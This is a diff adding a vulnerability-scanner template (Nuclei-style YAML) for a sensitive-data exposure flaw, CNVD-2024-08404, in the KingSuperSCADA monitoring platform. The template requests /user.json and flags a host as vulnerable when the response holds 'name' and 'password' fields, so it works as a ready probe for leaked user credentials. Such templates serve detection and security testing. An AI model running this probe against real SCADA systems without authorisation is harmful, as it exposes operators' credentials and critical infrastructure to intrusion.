@@ -1,0 +1,30 @@
+id: kingsuperscada-info-leak
+
+info:
+  name: "KingSuperSCADA敏感数据暴露缺陷"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    KingSuperSCADA监控平台存在敏感数据暴露漏洞，攻击者可通过特定路径获取系统敏感信息。该漏洞可能导致配置详情、用户凭证或其他关键数据泄露，威胁系统安全。受影响组件未明确指定，但漏洞利用无需复杂条件，潜在风险较高。
+  reference:
+  - CNVD-2024-08404
+  tags: KingSuperSCADA
+
+http:
+- raw:
+  - |
+    GET /user.json HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/javascript, */*; q=0.01
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'name'
+  - type: word
+    part: body
+    words:
+    - 'password'
